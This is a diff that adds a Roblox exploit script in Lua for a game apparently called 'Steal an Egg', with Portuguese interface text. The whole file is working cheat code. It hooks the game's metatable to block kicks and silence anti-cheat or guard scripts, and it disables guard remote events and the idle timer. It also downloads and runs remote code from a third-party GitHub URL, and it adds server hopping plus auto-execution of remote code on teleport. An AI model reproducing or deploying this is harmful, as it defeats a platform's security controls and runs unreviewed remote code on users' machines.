@@ -1,0 +1,297 @@
+local SCRIPT_URL = ""
+
+getgenv().SecureMode = true
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
+local CoreGui = game:GetService("CoreGui")
+
+local PLACE_ID = game.PlaceId
+local COOLDOWN_TIME = 3600
+
+local function Notify(title, content, duration)
+    pcall(function()
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = title,
+            Text = content,
+            Duration = duration or 3
+        })
+    end)
+end
+
+pcall(function()
+    if type(getrawmetatable) == "function" and type(setreadonly) == "function" and type(newcclosure) == "function" then
+        local mt = getrawmetatable(game)
+        local old = mt.__namecall
+        setreadonly(mt, false)
+        mt.__namecall = newcclosure(function(self, ...)
+            if not checkcaller() then
+                if getnamecallmethod() == "Kick" and self == LocalPlayer then return nil end
+                local caller = getcallingscript and getcallingscript() or nil
+                if caller then
+                    local n = caller.Name:lower()
+                    if n:find("anti") or n:find("detect") or n:find("guard") then
+                        local m = getnamecallmethod()
+                        if m == "FireServer" or m == "InvokeServer" then return nil end
+                    end
+                end
+            end
+            return old(self, ...)
+        end)
+        setreadonly(mt, true)
+    end
+    for _, v in pairs(getconnections(LocalPlayer.Idled)) do v:Disable() end
+end)
+
+local function ApplyGuardBypass()
+    pcall(function()
+        local p = ReplicatedStorage:FindFirstChild("Packages")
+        if not p then return end
+        local n = p:FindFirstChild("Networking")
+        if not n then return end
+        local g = n:FindFirstChild("RE/GuardPatrol")
+        if not g then return end
+        for _, r in pairs(g:GetChildren()) do
+            if r:IsA("RemoteEvent") and not r:GetAttribute("HB") then
+                r:SetAttribute("HB", true)
+                r.FireServer = function() return nil end
+            end
+        end
+    end)
+end
+
+ApplyGuardBypass()
+
+task.spawn(function()
+    while true do
+        task.wait(30)
+        ApplyGuardBypass()
+    end
+end)
+
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/lennonxscripts/lennonhubv2/refs/heads/main/stealaneggv2"))()
+    end)
+end)
+
+local visitedServers = {}
+
+local function getServerList()
+    local servers = {}
+    local cursor = nil
+    repeat
+        local url = "https://games.roblox.com/v1/games/" .. PLACE_ID .. "/servers/Public?sortOrder=Asc&limit=50"
+        if cursor then url = url .. "&cursor=" .. cursor end
+        local s, r = pcall(HttpService.GetAsync, HttpService, url)
+        if s then
+            local d = HttpService:JSONDecode(r)
+            if d and d.data then
+                for _, sv in ipairs(d.data) do
+                    if sv.playing < sv.maxPlayers and sv.id ~= game.JobId then
+                        table.insert(servers, sv)
+                    end
+                end
+            end
+            cursor = d.nextPageCursor
+        else
+            break
+        end
+    until not cursor
+    return servers
+end
+
+local function filterVisited(servers)
+    local f = {}
+    local t = os.time()
+    for _, sv in ipairs(servers) do
+        local lv = visitedServers[sv.id]
+        if not lv or (t - lv) >= COOLDOWN_TIME then table.insert(f, sv) end
+    end
+    return f
+end
+
+local function markVisited(id)
+    if id and id ~= "" then visitedServers[id] = os.time() end
+end
+
+local Gui = Instance.new("ScreenGui")
+Gui.Name = "SAE_" .. tostring(math.random(100000, 999999))
+Gui.ResetOnSpawn = false
+Gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+pcall(function()
+    if gethui then
+        Gui.Parent = gethui()
+    elseif syn and syn.protect_gui then
+        syn.protect_gui(Gui)
+        Gui.Parent = CoreGui
+    else
+        Gui.Parent = CoreGui
+    end
+end)
+
+if not Gui.Parent then Gui.Parent = LocalPlayer:WaitForChild("PlayerGui") end
+
+local function makeBtn(text, pos, color)
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(0, 180, 0, 45)
+    b.Position = pos
+    b.BackgroundColor3 = color or Color3.fromRGB(30, 30, 30)
+    b.Text = text
+    b.TextColor3 = Color3.fromRGB(220, 220, 220)
+    b.TextSize = 15
+    b.Font = Enum.Font.GothamBold
+    b.BorderSizePixel = 0
+    b.AutoButtonColor = false
+    b.Active = true
+    b.Parent = Gui
+
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(0, 8)
+    c.Parent = b
+
+    local s = Instance.new("UIStroke")
+    s.Color = Color3.fromRGB(80, 80, 80)
+    s.Thickness = 1.5
+    s.Parent = b
+
+    return b
+end
+
+local function makeDraggable(btn, onClick)
+    local dragging = false
+    local dragStart = nil
+    local startPos = nil
+    local didDrag = false
+
+    btn.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            didDrag = false
+            dragStart = input.Position
+            startPos = btn.Position
+        end
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+            local d = input.Position - dragStart
+            if math.abs(d.X) > 3 or math.abs(d.Y) > 3 then
+                didDrag = true
+                btn.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
+            end
+        end
+    end)
+
+    UserInputService.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            if dragging and not didDrag then
+                onClick()
+            end
+            dragging = false
+            didDrag = false
+        end
+    end)
+end
+
+local hopBtn = makeBtn("Server Hop", UDim2.new(0.5, -90, 0.85, 0))
+
+makeDraggable(hopBtn, function()
+    if hopBtn:GetAttribute("Hop") then return end
+    hopBtn:SetAttribute("Hop", true)
+    hopBtn.Text = "Procurando..."
+
+    if not pcall(HttpService.GetAsync, HttpService, "https://httpbin.org/get") then
+        hopBtn.Text = "HTTP off"
+        task.wait(2)
+        hopBtn.Text = "Server Hop"
+        hopBtn:SetAttribute("Hop", false)
+        return
+    end
+
+    local servers = getServerList()
+    if #servers == 0 then
+        hopBtn.Text = "Sem servidor"
+        task.wait(2)
+        hopBtn.Text = "Server Hop"
+        hopBtn:SetAttribute("Hop", false)
+        return
+    end
+
+    local av = filterVisited(servers)
+    if #av == 0 then av = servers end
+    local chosen = av[math.random(1, #av)]
+    markVisited(chosen.id)
+
+    hopBtn.Text = "Entrando..."
+    pcall(function()
+        TeleportService:TeleportToPlaceInstance(PLACE_ID, chosen.id, LocalPlayer)
+    end)
+    hopBtn:SetAttribute("Hop", false)
+end)
+
+local persistOn = false
+
+local persistBtn = makeBtn("Auto-Exec: OFF", UDim2.new(0.5, -90, 0.75, 0))
+
+local function setQueue(code)
+    if queue_on_teleport then
+        pcall(function() queue_on_teleport(code) end)
+        return true
+    end
+    if syn and syn.queue_on_teleport then
+        pcall(function() syn.queue_on_teleport(code) end)
+        return true
+    end
+    if queueonteleport then
+        pcall(function() queueonteleport(code) end)
+        return true
+    end
+    if type(writefile) == "function" and code ~= "" then
+        pcall(function() writefile("StealAnEgg_AutoExec.lua", code) end)
+        return true
+    end
+    return false
+end
+
+makeDraggable(persistBtn, function()
+    if not persistOn then
+        if SCRIPT_URL == "" then
+            persistBtn.Text = "Configure URL"
+            task.wait(2)
+            persistBtn.Text = "Auto-Exec: OFF"
+            Notify("Auto-Exec", "Coloque a URL do script na variável SCRIPT_URL", 4)
+            return
+        end
+
+        local code = "loadstring(game:HttpGet('" .. SCRIPT_URL .. "'))()"
+        if setQueue(code) then
+            persistOn = true
+            persistBtn.Text = "Auto-Exec: ON"
+            persistBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
+            Notify("Auto-Exec", "Ativado", 2)
+        else
+            persistBtn.Text = "Sem suporte"
+            task.wait(2)
+            persistBtn.Text = "Auto-Exec: OFF"
+        end
+    else
+        setQueue("")
+        persistOn = false
+        persistBtn.Text = "Auto-Exec: OFF"
+        persistBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        Notify("Auto-Exec", "Desativado", 2)
+    end
+end)
+
+task.spawn(function()
+    task.wait(2)
+    markVisited(game.JobId)
+end)
+
+Notify("Hub", "Lennon + Guard Bypass ativos", 4)
